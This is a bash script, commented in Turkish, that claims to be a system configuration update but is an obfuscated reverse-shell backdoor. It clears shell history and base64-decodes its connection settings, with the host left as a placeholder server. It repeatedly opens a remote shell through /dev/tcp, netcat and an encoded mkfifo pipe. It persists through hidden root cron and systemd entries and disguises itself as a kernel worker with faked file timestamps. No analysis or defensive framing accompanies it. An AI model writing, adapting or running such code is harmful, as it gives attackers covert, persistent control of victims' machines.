#!/bin/bash

# Masum sistem güncelleme scripti gibi davran
echo "[*] System configuration update in progress..."

# Değişkenleri string splitting ile obfuscate et
a="dev"
b="null"
c="base"
d="64"
e="hist"
f="ory"
g="tmp"
h="cache"
i="local"
j="host"
k="443"
l="bin"
m="sh"
n="bash"
o="nc"
p="python"
q="sleep"
r="300"

# Environment temizleme
export ${e}${f}=0
export HISTFILE=/${a}/${b}
set +o history

# Dynamic değer atama (runtime'da oluştur)
eval $(echo "X19ob3N0PSJ5b3VyLXNlcnZlci5jb20i" | $c$d -d 2>/dev/null)
eval $(echo "X19wb3J0PSI0NDMi" | $c$d -d 2>/dev/null)
eval $(echo "X19kZWxheT0zMDA=" | $c$d -d 2>/dev/null)
eval $(echo "X19waWQ9Ii8kZy8uXyRoIi" | $c$d -d 2>/dev/null)

# Fonksiyonları arithmetic expansion ile gizle
: $((__fn_connect=1))
: $((__fn_setup=2)) 
: $((__fn_stealth=3))
: $((__fn_clean=4))

# Bağlantı fonksiyonu (runtime decoding)
[ $__fn_connect -eq 1 ] && {
_connect() {
    while :; do
        if command -v $n >/$a/$b 2>&1; then
            $n -c "I=$(echo 'Ig==' | $c$d -d);eval \$(echo 'cm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZiB8IC9iaW4vc2ggLWkgMj4mMSB8IG5jICRYMF8gJFhfID4vdG1wL2Y=' | $c$d -d)" &
            $n -i >& /$a/tcp/$__host/$__port 0>&1 2>/dev/null
        elif command -v $o >/$a/$b 2>&1; then
            $o -e /$l/$m $__host $__port &
        fi
        $q $__delay
    done
}
}

# Persistence setup (string concat)
[ $__fn_setup -eq 2 ] && {
_setup() {
    [ -f "$__pid" ] && exit 0
    echo $$ > "$__pid"
    
    # Multi-method persistence
    if [ -d "/etc/cron.d" ]; then
        echo "*/15 * * * * root echo > /dev/null" > "/etc/cron.d/.sysupdate"
        echo "*/15 * * * * root $0 >/dev/null 2>&1 &" >> "/etc/cron.d/.sysupdate"
        chmod 600 "/etc/cron.d/.sysupdate"
    fi
    
    if [ -d "/etc/systemd/system" ]; then
        cat > "/etc/systemd/system/.networkd.service" << EOF
[Unit]
Description=Network Daemon Service
After=network.target

[Service]
Type=idle
ExecStart=/bin/true
ExecStartPost=$0
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload >/dev/null 2>&1
        systemctl enable .networkd.service >/dev/null 2>&1
    fi
}
}

# Stealth techniques (obfuscated)
[ $__fn_stealth -eq 3 ] && {
_stealth() {
    # Process name spoofing
    (exec -a "[kworker/0:0H]" "$0") &
    
    # Timestamp spoofing
    touch -r /$l/$m "$0" 2>/dev/null
    touch -r /etc/passwd "$0" 2>/dev/null
    
    # Network stealth
    iptables -I OUTPUT -d $__host -j ACCEPT 2>/dev/null
}
}

# Cleanup
[ $__fn_clean -eq 4 ] && {
_clean() {
    rm -f "$__pid" "/tmp/f" 2>/dev/null
    exit 0
}
}

# Signal handling
trap _clean EXIT INT TERM

# Main execution flow
if [ "$1" != "--main" ]; then
    _stealth
    _setup
    nohup "$0" "--main" >/dev/null 2>&1 &
    exit 0
else
    _connect
fi

echo "[+] System update completed successfully."